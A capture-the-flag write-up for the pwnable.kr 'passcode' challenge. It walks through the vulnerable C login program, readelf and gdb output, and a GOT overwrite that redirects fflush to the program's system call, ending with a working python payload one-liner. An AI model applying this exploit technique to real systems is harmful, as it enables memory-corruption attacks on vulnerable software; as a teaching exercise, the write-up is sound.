"""
Mommy told me to make a passcode based login system.
My initial C code was compiled without any error!
Well, there was some compiler warning, but who cares about that?

ssh passcode@pwnable.kr -p2222 (pw:guest)
"""

1.      check the code
                cat ./passcode.c
        -------------------------
                #include <stdio.h>
                #include <stdlib.h>

                void login(){
                        int passcode1;
                        int passcode2;

                        printf("enter passcode1 : ");
                        scanf("%d", passcode1);
                        fflush(stdin);

                        // ha! mommy told me that 32bit is vulnerable to bruteforcing :)
                        printf("enter passcode2 : ");
                        scanf("%d", passcode2);

                        printf("checking...\n");
                        if(passcode1==338150 && passcode2==13371337){
                                printf("Login OK!\n");
                                system("/bin/cat flag");
                        }
                        else{
                                printf("Login Failed!\n");
                                exit(0);
                        }
                }

                void welcome(){
                        char name[100];
                        printf("enter you name : ");
                        scanf("%100s", name);
                        printf("Welcome %s!\n", name);
                }

                int main(){
                        printf("Toddler's Secure Login System 1.0 beta.\n");

                        welcome();
                        login();

                        // something after login...
                        printf("Now I can safely trust you that you have credential :)\n");
                        return 0;
                }


2.      run ./passcode and notice the error
                segmentation fault

        review the code, and notice the 2 scanf() in login():
                scanf("%d", passcode1);
                ...
                scanf("%d", passcode2);
                ...

        scanf() will read invalid address of the memory, which cause the segmentation fault;


3.      Well, after searching, the key is the GOT table;
        basically, the point is to overwrite fflush() with system();
        so when fflush() is called, program will execute system();
        
        First step is to locate fflush().


4.      check the GOT table:
                readelf -r passcode
        -------------------------------------------
                passcode@ubuntu:~$ readelf -r passcode

                Relocation section '.rel.dyn' at offset 0x388 contains 2 entries:
                Offset     Info    Type            Sym.Value  Sym. Name
                08049ff0  00000606 R_386_GLOB_DAT    00000000   __gmon_start__
                0804a02c  00000b05 R_386_COPY        0804a02c   stdin@GLIBC_2.0

                Relocation section '.rel.plt' at offset 0x398 contains 9 entries:
                Offset     Info    Type            Sym.Value  Sym. Name
                0804a000  00000107 R_386_JUMP_SLOT   00000000   printf@GLIBC_2.0
                0804a004  00000207 R_386_JUMP_SLOT   00000000   fflush@GLIBC_2.0
                0804a008  00000307 R_386_JUMP_SLOT   00000000   __stack_chk_fail@GLIBC_2.4
                0804a00c  00000407 R_386_JUMP_SLOT   00000000   puts@GLIBC_2.0
                0804a010  00000507 R_386_JUMP_SLOT   00000000   system@GLIBC_2.0
                0804a014  00000607 R_386_JUMP_SLOT   00000000   __gmon_start__
                0804a018  00000707 R_386_JUMP_SLOT   00000000   exit@GLIBC_2.0
                0804a01c  00000807 R_386_JUMP_SLOT   00000000   __libc_start_main@GLIBC_2.0
                0804a020  00000907 R_386_JUMP_SLOT   00000000   __isoc99_scanf@GLIBC_2.7    

        notice that:
                fflush -> 0x0804a004
        means that fflush() is at 0x0804a004
        so if we want to overwrite it with func():
                fflush -> (address of func())
        
        in gdb, with disas we can see:

                (gdb) disas welcome
                Dump of assembler code for function welcome:
                0x08048609 <+0>:     push   %ebp
                0x0804860a <+1>:     mov    %esp,%ebp
                0x0804860c <+3>:     sub    $0x88,%esp
                0x08048612 <+9>:     mov    %gs:0x14,%eax
                0x08048618 <+15>:    mov    %eax,-0xc(%ebp)
                0x0804861b <+18>:    xor    %eax,%eax
                0x0804861d <+20>:    mov    $0x80487cb,%eax
                0x08048622 <+25>:    mov    %eax,(%esp)
                0x08048625 <+28>:    call   0x8048420 <printf@plt>
                0x0804862a <+33>:    mov    $0x80487dd,%eax
                0x0804862f <+38>:    lea    -0x70(%ebp),%edx
                0x08048632 <+41>:    mov    %edx,0x4(%esp)
                0x08048636 <+45>:    mov    %eax,(%esp)
                0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
                0x0804863e <+53>:    mov    $0x80487e3,%eax
                0x08048643 <+58>:    lea    -0x70(%ebp),%edx
                0x08048646 <+61>:    mov    %edx,0x4(%esp)
                0x0804864a <+65>:    mov    %eax,(%esp)
                0x0804864d <+68>:    call   0x8048420 <printf@plt>
                0x08048652 <+73>:    mov    -0xc(%ebp),%eax
                0x08048655 <+76>:    xor    %gs:0x14,%eax
                0x0804865c <+83>:    je     0x8048663 <welcome+90>
                0x0804865e <+85>:    call   0x8048440 <__stack_chk_fail@plt>
                0x08048663 <+90>:    leave
                0x08048664 <+91>:    ret
                End of assembler dump.

                (gdb) disas login
                Dump of assembler code for function login:
                0x08048564 <+0>:     push   %ebp
                0x08048565 <+1>:     mov    %esp,%ebp
                0x08048567 <+3>:     sub    $0x28,%esp
                0x0804856a <+6>:     mov    $0x8048770,%eax
                0x0804856f <+11>:    mov    %eax,(%esp)
                0x08048572 <+14>:    call   0x8048420 <printf@plt>
                0x08048577 <+19>:    mov    $0x8048783,%eax
                0x0804857c <+24>:    mov    -0x10(%ebp),%edx
                0x0804857f <+27>:    mov    %edx,0x4(%esp)
                0x08048583 <+31>:    mov    %eax,(%esp)
                0x08048586 <+34>:    call   0x80484a0 <__isoc99_scanf@plt>
                0x0804858b <+39>:    mov    0x804a02c,%eax
                0x08048590 <+44>:    mov    %eax,(%esp)
                0x08048593 <+47>:    call   0x8048430 <fflush@plt>
                0x08048598 <+52>:    mov    $0x8048786,%eax
                0x0804859d <+57>:    mov    %eax,(%esp)
                0x080485a0 <+60>:    call   0x8048420 <printf@plt>
                0x080485a5 <+65>:    mov    $0x8048783,%eax
                0x080485aa <+70>:    mov    -0xc(%ebp),%edx
                0x080485ad <+73>:    mov    %edx,0x4(%esp)
                0x080485b1 <+77>:    mov    %eax,(%esp)
                0x080485b4 <+80>:    call   0x80484a0 <__isoc99_scanf@plt>
                0x080485b9 <+85>:    movl   $0x8048799,(%esp)
                0x080485c0 <+92>:    call   0x8048450 <puts@plt>
                0x080485c5 <+97>:    cmpl   $0x528e6,-0x10(%ebp)
                0x080485cc <+104>:   jne    0x80485f1 <login+141>
                0x080485ce <+106>:   cmpl   $0xcc07c9,-0xc(%ebp)
                0x080485d5 <+113>:   jne    0x80485f1 <login+141>
                0x080485d7 <+115>:   movl   $0x80487a5,(%esp)
                0x080485de <+122>:   call   0x8048450 <puts@plt>
                0x080485e3 <+127>:   movl   $0x80487af,(%esp)
                0x080485ea <+134>:   call   0x8048460 <system@plt>
                0x080485ef <+139>:   leave
                0x080485f0 <+140>:   ret
                0x080485f1 <+141>:   movl   $0x80487bd,(%esp)
                0x080485f8 <+148>:   call   0x8048450 <puts@plt>
                0x080485fd <+153>:   movl   $0x0,(%esp)
                0x08048604 <+160>:   call   0x8048480 <exit@plt>
                End of assembler dump.

        notice in login(), system() is called at:
                ...
                0x080485e3 <+127>:   movl   $0x80487af,(%esp)
                0x080485ea <+134>:   call   0x8048460 <system@plt>                
                ...
        so the part we want to overwrite into fflush() is start from 0x080485e3


5.      When overwriting, use char name[100] in welcome to overbuffer:
        notice that name in welcome is at:
                ...
                0x0804862f <+38>:    lea    -0x70(%ebp),%edx
                0x08048632 <+41>:    mov    %edx,0x4(%esp)
                0x08048636 <+45>:    mov    %eax,(%esp)
                0x08048639 <+48>:    call   0x80484a0 <__isoc99_scanf@plt>
                ...
        so name is at:
                -0x70(%ebp)

        at the same time, passcode1 is at:
                -0x10(%ebp)
        
6.      the process is:
        a)      Pass 0x0804a004(address of fflush()) into passcode;
        b)      Program execute:
                        scanf("%d", passcode);
                
                which is like:
                        scanf("%d", 0x0804a004);
                meaning that the following to be read will be written into 0x0804a004
                that will cover the fflush();
        c)      The input should be 0x080485e3, which is 134514147 in decimal
                so the input should be:
                        'a' * (0x70 - 0x10) + '\x04\xa0\x04\x08' + '134514147\n'
                ('\n' used to pass the input number in scanf());


7.      Pass the input into passcode:
                python -c "print 'a' * (0x70 - 0x10) + '\x04\xa0\x04\x08' + '134514147\n'" | ./passcode
           

PS.
1.      For further details, (actually written as a memo)check page:
                https://blog.csdn.net/smalosnail/article/details/53247502
        or search for details:
                Global Offset Table overwrite exploit
                GOT and PLT
                Format String Exploit, etc

If anything wrong with this idea, or there is any other method, or anything else(such as my poor english):
please contact me: songdy0x0tter@gmail.com
I'll appreciate it very much if anyone find any fault in these writeup. Thx.